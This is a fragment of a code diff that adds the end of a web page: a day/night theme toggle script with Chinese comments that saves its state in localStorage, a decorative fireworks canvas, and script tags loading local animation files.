+      // 如果是白天模式：显示月亮图标，背景换成 pic1
+      document.body.style.backgroundImage = pic1;
+      icon.className = 'fa fa-moon';
+    }
+  }
+
+  // 页面加载时先应用一次状态
+  applyState();
+
+  // 点击事件监听
+  btn.addEventListener('click', function() {
+    isNight = !isNight; // 状态反转
+    applyState(); // 应用新状态
+    // 将状态保存到浏览器缓存，防止刷新页面后重置
+    localStorage.setItem('isNight', isNight);
+  });
+})();
+</script>
+<canvas class="fireworks" style="position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9999;"></canvas>
+<script src="/js/anime.min.js"></script>
+<script src="/js/fireworks.js"></script>
+<script src="/js/read-more-reveal.js"></script>
+</body>
+</html>
